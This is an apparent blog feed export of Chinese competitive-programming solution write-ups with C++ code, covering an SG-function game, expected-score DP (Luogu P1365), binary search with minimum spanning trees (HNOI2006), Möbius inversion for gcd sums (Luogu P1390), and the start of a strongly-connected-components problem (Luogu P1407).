<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> sg;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Node</span>() : <span class="built_in">sg</span>(<span class="number">-1</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *s, Node *t)</span> </span>&#123;</span><br><span class="line">    s-&gt;e.<span class="built_in">emplace_back</span>(s, t);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SG</span><span class="params">(Node *u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;sg != <span class="number">-1</span>) <span class="keyword">return</span> u-&gt;sg;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">bool</span>&gt; <span class="title">vis</span><span class="params">(u-&gt;e.size() + <span class="number">1</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[u, v] : u-&gt;e) vis[<span class="built_in">SG</span>(v)] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    u-&gt;sg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (vis[u-&gt;sg]) u-&gt;sg++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u-&gt;sg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[x], &amp;nodes[y]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">        ans ^= <span class="built_in">SG</span>(&amp;nodes[x]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(ans ? <span class="string">&quot;win&quot;</span> : <span class="string">&quot;lose&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>数学</tag>
        <tag>博弈论</tag>
        <tag>SG 函数</tag>
        <tag>LibreOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P1365」Easy - 概率与期望</title>
    <url>/luogu-1365/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1365">洛谷链接</a></p>
<p>有一种音游的计分方式为在一首歌中有 <span
class="math inline">\(n\)</span> 次点击要做，成功了就是
<code>o</code>，失败了就是 <code>x</code>，分数是按 combo 计算的，连续
<span class="math inline">\(a\)</span> 个 combo 就有 <span
class="math inline">\(a\times a\)</span> 分，combo 就是极大的连续
<code>o</code>。</p>
<p>Sevenkplus 闲的慌就看他打了一盘，有些地方跟运气无关要么是
<code>o</code> 要么是 <code>x</code>，有些地方 <code>o</code> 或者
<code>x</code> 各有 <span class="math inline">\(50\%\)</span>
的可能性，用 <code>?</code> 号来表示。</p>
<p>那么的期望得分是多少？</p>
<p>数据范围：<span class="math inline">\(n\le3\times10^5\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于这种期望题，我们可以用 DP 解决。</p>
<p>我们可以定义状态 <span class="math inline">\(f_i\)</span> 表示在第
<span class="math inline">\(i\)</span>
次点击中获得分数的期望，同时我们可以定义 <span
class="math inline">\(\text{len}\)</span> 为当前连击数的期望。</p>
<p>我们有以下三种情况：</p>
<ol type="1">
<li>第 <span class="math inline">\(i\)</span> 次点击为
<code>x</code>：显然 <span class="math inline">\(f_i = f_{i -
1}\)</span>，<span class="math inline">\(\text{len} = 0\)</span></li>
<li>第 <span class="math inline">\(i\)</span> 次点击为
<code>o</code>：对于连续次 combo 可加的分为 <span
class="math inline">\((\text{len + 1})^2 - \text{len}^2 = 2 \times
\text{len} + 1\)</span>，故 <span class="math inline">\(f_i = f_{i - 1}
+ 2 \times \text{len} + 1\)</span>，<span
class="math inline">\(\text{len} = \text{len} + 1\)</span></li>
<li>第 <span class="math inline">\(i\)</span> 次点击为
<code>?</code>：则有 <span class="math inline">\(50\%\)</span> 为
<code>x</code>，<span class="math inline">\(50\%\)</span> 为
<code>o</code>。故两种情况求平均值即可。即 <span
class="math inline">\(f_i = \frac{f_{i - 1} + f_{i - 1} + 2 \times
\text{len} + 1}{2} = f_{i - 1} + \text{len} + 0.5\)</span>，<span
class="math inline">\(\text{len} = \frac{0 + \text{len} + 1}{2} =
\frac{\text{len} + 1}{2}\)</span></li>
</ol>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">300000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> str[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, str + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">double</span> f[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="type">double</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (str[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                f[i] = f[i - <span class="number">1</span>];</span><br><span class="line">                len = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">                f[i] = f[i - <span class="number">1</span>] + <span class="number">2</span> * len + <span class="number">1</span>;</span><br><span class="line">                len++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                f[i] = f[i - <span class="number">1</span>] + len + <span class="number">0.5</span>;</span><br><span class="line">                len = (len + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.4lf\n&quot;</span>, f[n]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>概率与期望</tag>
        <tag>数学</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「HNOI2006」公路修建问题 - 二分答案 + 最小生成树</title>
    <url>/hnoi2006-road/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2323">洛谷链接</a></p>
<p>OI island
是一个非常漂亮的岛屿，自开发以来，到这儿来旅游的人很多。然而，由于该岛屿刚刚开发不久，所以那里的交通情况还是很糟糕。所以，OIER
Association 组织成立了，旨在建立 OI island 的交通系统。</p>
<p>OI island 有 <span class="math inline">\(n\)</span>
个旅游景点，不妨将它们从 <span class="math inline">\(1\)</span> 到 <span
class="math inline">\(n\)</span> 标号。现在，OIER Association
需要修公路将这些景点连接起来。一条公路连接两个景点。公路有，不妨称它们为一级公路和二级公路。一级公路上的车速快，但是修路的花费要大一些。</p>
<p>OIER Association 打算修 <span class="math inline">\(n-1\)</span>
条公路将这些景点连接起来（使得任意两个景点之间都会有一条路径）。为了保证公路系统的效率，
OIER Association 希望在这 <span class="math inline">\(n-1\)</span>
条公路之中，至少有 <span class="math inline">\(k\)</span> 条 <span
class="math inline">\((0 \le k \le n-1)\)</span> 一级公路。OIER
Association
也不希望为一条公路花费的钱。所以，他们希望在满足上述条件的情况下，花费最多的一条公路的花费尽可能的少。</p>
<p>而你的任务就是，在给定一些可能修建的公路的情况下，选择 <span
class="math inline">\(n-1\)</span> 条公路，满足上面的条件。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题求的是满足条件的最大公路花费的最小值。显然我们可以二分答案最长边的权值。</p>
<p>而对于本题中对一级公路的限制，我们可以在最长边权值限制下尽量多地选择一级公路构成生成树。在一级公路选完后再选二级公路。</p>
<p>最后通过调整二分，找出其中一级公路满足条件且所选边足够构成一棵树地最大边权的最小值即为答案。</p>
<p>本题同时要求输出方案，可在求生成树的时候同时把所选边存下来即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e4</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXM = <span class="number">2e4</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXC = <span class="number">3e4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="type">int</span> c1, c2;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Edge &amp;other) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> c1 &lt; other.c1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; E[MAXM + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UFS</span> &#123;</span><br><span class="line">    <span class="type">int</span> f[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) f[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x == f[x] ? x : f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">        f[<span class="built_in">find</span>(x)] = <span class="built_in">find</span>(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; ufs;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, k, m;</span><br><span class="line">std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; id[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> limit)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; ids[MAXN];</span><br><span class="line">    ufs.<span class="built_in">init</span>(n);</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        Edge &amp;e = E[i];</span><br><span class="line">        <span class="keyword">if</span> (e.c1 &gt; limit) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (ufs.<span class="built_in">find</span>(e.a) == ufs.<span class="built_in">find</span>(e.b)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        ufs.<span class="built_in">merge</span>(e.a, e.b);</span><br><span class="line">        ids[++cnt] = std::<span class="built_in">make_pair</span>(e.id, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cnt &lt; k) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cnt == n - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) id[i] = ids[i];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Edge &amp;e = E[i];</span><br><span class="line">        <span class="keyword">if</span> (e.c2 &gt; limit) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (ufs.<span class="built_in">find</span>(e.a) == ufs.<span class="built_in">find</span>(e.b)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        ufs.<span class="built_in">merge</span>(e.a, e.b);</span><br><span class="line">        ids[++cnt] = std::<span class="built_in">make_pair</span>(e.id, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cnt == n - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) id[i] = ids[i];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;k, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = MAXC, r = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;E[i].a, &amp;E[i].b, &amp;E[i].c1, &amp;E[i].c2);</span><br><span class="line">        E[i].id = i;</span><br><span class="line">        l = std::<span class="built_in">min</span>(l, std::<span class="built_in">min</span>(E[i].c1, E[i].c2));</span><br><span class="line">        r = std::<span class="built_in">max</span>(r, std::<span class="built_in">max</span>(E[i].c1, E[i].c2));</span><br><span class="line">    &#125;</span><br><span class="line">    std::<span class="built_in">sort</span>(E + <span class="number">1</span>, E + m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">solve</span>(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line">    std::<span class="built_in">sort</span>(id + <span class="number">1</span>, id + n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, id[i].first, id[i].second);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>图论</tag>
        <tag>二分</tag>
        <tag>HNOI</tag>
        <tag>二分答案</tag>
        <tag>最小生成树</tag>
        <tag>2006</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P1390」公约数的和 - 莫比乌斯反演</title>
    <url>/luogu-1390/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1390">洛谷链接</a></p>
<p>给定 <span class="math inline">\(n\)</span>，求</p>
<p><span class="math display">\[\sum_{i = 1}^n \sum_{j = i + 1}^n
\gcd(i, j)\]</span></p>
<p>其中 <span class="math inline">\(\gcd(i, j)\)</span> 表示 <span
class="math inline">\(i\)</span> 和 <span
class="math inline">\(j\)</span> 的最大公约数。</p>
<p>数据范围：<span class="math inline">\(2 \leq n \leq 2 \times
10^6\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<h2 id="问题转化">问题转化</h2>
<p>我们设函数 <span class="math inline">\(A(n) = \sum_{i = 1}^n \sum_{j
= i + 1}^n \gcd(i, j)\)</span>，很显然 <span
class="math inline">\(A(n)\)</span> 即为答案。</p>
<p>对于 <span class="math inline">\(A(n)\)</span> 不好求
<del>我直接硬刚了好久算出来还是错的
QWQ</del>，于是我们可以简化一下。我们可以设 <span
class="math inline">\(B(n) = \sum_{i = 1}^n \sum_{j = 1}^n \gcd(i,
j)\)</span>。根据容斥原理，可得下列关系：</p>
<p><span class="math display">\[
\begin{align*}
A(n) &amp;= \frac{B(n) - \sum_{i = 1}^n i}{2} \\
&amp;= \frac{ B(n) - \frac{n^2 - n}{2} }{2}
\end{align*}
\]</span></p>
<p>于是我们问题转为求 <span class="math inline">\(B(n)\)</span>
的值。</p>
<h2 id="莫比乌斯反演">莫比乌斯反演</h2>
<p>我们设函数 <span class="math inline">\(f(x) = \sum_{i = 1}^n \sum_{j
= 1}^n [\gcd(i, j) = 1]\)</span>，很显然 <span
class="math inline">\(B(n) = \sum_{i = 1}^n{i f(i)}\)</span>。</p>
<p>接着我们设函数 <span class="math inline">\(F(d) = \sum_{d |
x}{f(x)}\)</span>，于是可做下列代数变化：</p>
<p><span class="math display">\[
\begin{align*}
F(d) &amp;= \sum_{d | x}{f(x)} \\
&amp;= \sum_{d | x} \sum_{i = 1}^n \sum_{j = 1}^n [\gcd(i, j) = x] \\
&amp;= \sum_{t = 1}^{\lfloor \frac{n}{d} \rfloor} \sum_{i = 1}^n \sum_{j
= 1}^n [\gcd(i, j) = td] \\
&amp;= \sum_{i = 1}^n \sum_{j = 1}^n [d | \gcd(i, j)] \\
&amp;= \sum_{i = 1}^n \sum_{j = 1}^n [d | i][d | j] \\
&amp;= {\lfloor \frac{n}{d} \rfloor}^2
\end{align*}
\]</span></p>
<p>于是我们可以进行莫比乌斯反演：</p>
<p><span class="math display">\[
\begin{align*}
f(x) &amp;= \sum_{x | d}{\mu(\frac{d}{x}) F(d)} \\
&amp;= \sum_{x | d}{\mu(\frac{d}{x}) {\lfloor \frac{n}{d} \rfloor}^2} \\
&amp;= \sum_{t = 1}^{\lfloor \frac{n}{x} \rfloor}{\mu(t) {\lfloor
\frac{n}{xt} \rfloor}^2}
\end{align*}
\]</span></p>
<p>故我们可得：</p>
<p><span class="math display">\[
\begin{align*}
B(n) &amp;= \sum_{i = 1}^n{i \sum_{t = 1}^{\lfloor \frac{n}{x}
\rfloor}{\mu(t) {\lfloor \frac{n}{xt} \rfloor}^2} } \\
&amp;= \sum_{i = 1}^n{ \sum_{t = 1}^{\lfloor \frac{n}{x} \rfloor}{i
\mu(t) {\lfloor \frac{n}{xt} \rfloor}^2} } \\
&amp;= \sum_{d = 1}^n \sum_{x | d}{x \mu(\frac{d}{x}) {\lfloor
\frac{n}{d} \rfloor}^2} \\
&amp;= \sum_{d = 1}^n{ {\lfloor \frac{n}{d} \rfloor}^2 \sum_{x | d}{x
\mu(\frac{d}{x})} }
\end{align*}
\]</span></p>
<h2 id="欧拉函数处理">欧拉函数处理</h2>
<p>为了处理 <span
class="math inline">\(B(n)\)</span>，我们可以引出一条引理：</p>
<p><span class="math display">\[
\sum_{x | d}{x \mu(\frac{d}{x})} = \varphi(d)
\]</span></p>
<p>证明：由欧拉函数的性质可得 <span class="math inline">\(\sum_{d | x}
\varphi(d) = x\)</span>，于是我们可由莫比乌斯反演得：<span
class="math inline">\(\varphi(x) = \sum_{d | x}{ \mu(d) \frac{n}{x}
}\)</span>，该式与原式等价，得证。</p>
<p>于是带入 <span class="math inline">\(B(n)\)</span>，可得：</p>
<p><span class="math display">\[
B(n) = \sum_{d = 1}^n{ {\lfloor \frac{n}{d} \rfloor}^2 \varphi(d) }
\]</span></p>
<p>带入 <span class="math inline">\(A(n)\)</span>，可得出答案：</p>
<p><span class="math display">\[
A(n) = \frac{ \sum_{d = 1}^n{ {\lfloor \frac{n}{d} \rfloor}^2 \varphi(d)
} - \frac{n^2 - n}{2} }{2}
\]</span></p>
<p>于是我们仅需线性筛出 <span
class="math inline">\(\varphi(x)\)</span>，接着直接计算即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">2e6</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> v[MAXN + <span class="number">1</span>], prime[MAXN + <span class="number">1</span>], phi[MAXN + <span class="number">1</span>], m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">euler</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(v, <span class="number">0</span>, <span class="built_in">sizeof</span>(v));</span><br><span class="line">    phi[<span class="number">1</span>] = <span class="number">1</span>, m = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v[i] == <span class="number">0</span>) &#123;</span><br><span class="line">            v[i] = i;</span><br><span class="line">            prime[++m] = i;</span><br><span class="line">            phi[i] = i - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prime[j] &gt; v[i] || prime[j] &gt; n / i) <span class="keyword">break</span>;</span><br><span class="line">            v[i * prime[j]] = prime[j];</span><br><span class="line">            phi[i * prime[j]] = phi[i] * (i % prime[j] ? prime[j] - <span class="number">1</span> : prime[j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">euler</span>(n);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) ans += <span class="number">1ll</span> * (n / i) * (n / i) * phi[i];</span><br><span class="line">    ans = (ans - (<span class="number">1ll</span> * n * n + n) / <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性筛</tag>
        <tag>莫比乌斯反演</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P1407」稳定婚姻 - 强连通分量</title>
    <url>/luogu-1407/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1407">洛谷链接</a></p>
<p>我们已知 <span class="math inline">\(n\)</span>
对夫妻的婚姻状况，称第 <span class="math inline">\(i\)</span>
对夫妻的男方为 <span class="math inline">\(B_i\)</span>，女方为 <span
class="math inline">\(G_i\)</span>。若某男 <span
class="math inline">\(B_i\)</span> 与某女 <span
class="math inline">\(G_j\)</span>
曾经交往过（无论是大学，高中，亦或是幼儿园阶段，<span
class="math inline">\(i \le j\)</span>），则当某方与其配偶（即 <span
class="math inline">\(B_i\)</span> 与 <span
class="math inline">\(G_i\)</span>或 <span
class="math inline">\(B_j\)</span> 与 <span
class="math inline">\(G_j\)</span>）感情出现问题时，他们有私奔的可能性。不妨设
<span class="math inline">\(B_i\)</span> 和其配偶 <span
class="math inline">\(G_i\)</span> 感情不和，于是 <span
class="math inline">\(B_i\)</span> 和 <span
class="math inline">\(G_j\)</span> 旧情复燃，进而 <span
class="math inline">\(B_j\)</span>
因被戴绿帽而感到不爽，联系上了他的初恋情人 <span
class="math inline">\(G_k\)</span>……一串串的离婚事件像多米诺骨牌一般接踵而至。若在
<span class="math inline">\(B_i\)</span> 和 <span
class="math inline">\(G_i\)</span> 离婚的前提下，这 <span
class="math inline">\(2n\)</span> 个人最终依然能够结合成 <span
class="math inline">\(n\)</span> 对情侣，那么我们称婚姻 <span
class="math inline">\(i\)</span> 为不安全的，否则婚姻 <span
class="math inline">\(i\)</span> 就是安全的。</p>
<p>给定所需信息，你的任务是判断每对婚姻是否安全。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这道题考得是图的连通性。</p>
<p>由于若一人感情不和，随之不和的是异性，我们可以在异性之间连有向边。</p>
<p>于是我们可以考虑用以下方式建图：</p>
<ul>
<li><p>对于夫妻，我们连一条 <span class="math inline">\(G_i \rightarrow
B_i\)</span> 的有向边；</p></li>
<li><p>对于情侣，我们连一条 <span class="math inline">\(B_i \rightarrow
G_j\)</span> 的有向边。</p></li>
</ul>
<p>接下来跑一边 Tarjan 求强连通分量。若 <span
class="math inline">\(G_i\)</span> 和 <span
class="math inline">\(B_i\)</span>
在同一个强连通分量中，则他们的婚姻是不安全的。</p>
<h1 id="代码演示">代码演示</h1>
